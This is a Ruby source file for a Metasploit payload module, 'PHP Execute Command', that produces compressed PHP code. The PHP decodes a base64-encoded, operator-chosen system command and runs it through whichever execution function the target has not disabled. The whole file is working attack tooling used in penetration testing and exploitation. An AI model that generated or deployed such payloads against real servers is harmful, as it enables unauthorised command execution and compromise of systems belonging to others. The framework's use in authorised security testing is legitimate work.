##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Execute Command ',
      'Description'   => 'Execute a single system command',
      'Author'        => [ 'egypt' ],
      'License'       => BSD_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP
      ))
    register_options(
      [
        OptString.new('CMD', [ true, "The command string to execute" ]),
      ])
  end

  def php_exec_cmd

    cmd = Rex::Text.encode_base64(datastore['CMD'])
    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
    shell = <<-END_OF_PHP_CODE
    #{php_preamble(disabled_varname: dis)}
    $c = base64_decode("#{cmd}");
    #{php_system_block(cmd_varname: "$c", disabled_varname: dis)}
    END_OF_PHP_CODE

    return Rex::Text.compress(shell)
  end

  #
  # Constructs the payload
  #
  def generate
    return php_exec_cmd
  end
end
